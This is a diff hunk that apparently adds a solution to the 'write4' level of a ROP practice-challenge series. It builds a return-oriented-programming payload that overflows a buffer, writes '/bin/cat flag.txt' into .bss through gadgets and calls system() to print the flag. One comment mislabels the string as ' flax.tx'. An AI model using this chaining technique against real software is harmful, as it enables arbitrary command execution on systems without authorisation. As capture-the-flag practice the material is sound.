@@ -106,8 +106,44 @@ def callme(path):
 
     return True
 
-def write4():
-    pass
+def write4(path):
+
+    payload = b''
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # fill buffer
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # fill buffer
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # fill buffer
+    payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # fill buffer
+    payload += b'\x42\x42\x42\x42\x42\x42\x42\x42' # fill buffer (overwrite RSP)
+
+    payload += b'\x90\x08\x40\x00\x00\x00\x00\x00' # pop r14, pop r15, ret
+    payload += b'\x60\x10\x60\x00\x00\x00\x00\x00' # r14 -> .bss
+    payload += b'\x2f\x62\x69\x6e\x2f\x63\x61\x74' # r15 = "/bin/cat"
+    payload += b'\x20\x08\x40\x00\x00\x00\x00\x00' # mov [r14], r15
+
+    payload += b'\x90\x08\x40\x00\x00\x00\x00\x00' # pop r14, pop r15, ret
+    payload += b'\x68\x10\x60\x00\x00\x00\x00\x00' # r14 -> .bss+8
+    payload += b'\x20\x66\x6c\x61\x67\x2e\x74\x78' # r15 = " flax.tx"
+    payload += b'\x20\x08\x40\x00\x00\x00\x00\x00' # mov [r14], r15
+
+    payload += b'\x90\x08\x40\x00\x00\x00\x00\x00' # pop r14, pop r15, ret
+    payload += b'\x70\x10\x60\x00\x00\x00\x00\x00' # r14 -> .bss+0x10
+    payload += b'\x74\x00\x00\x00\x00\x00\x00\x00' # r15 = "t\x00"
+    payload += b'\x20\x08\x40\x00\x00\x00\x00\x00' # mov [r14], r15
+
+    payload += b'\x93\x08\x40\x00\x00\x00\x00\x00' # pop rdi, ret
+    payload += b'\x60\x10\x60\x00\x00\x00\x00\x00' # ->"/bin/cat flag.txt"
+    payload += b'\x10\x08\x40\x00\x00\x00\x00\x00' # call _system()
+    payload += b'\x43\x43\x43\x43\x43\x43\x43\x43' # dummy (stack alignment)
+    payload += b'\x79\x06\x40\x00\x00\x00\x00\x00' # hlt
+
+    p = process(path)
+    p.sendline(payload)
+    fluff = p.recv()
+    flag = p.recvline()
+    #p.interactive()
+    success(flag)
+
+    return True
 
 
 def badchars():
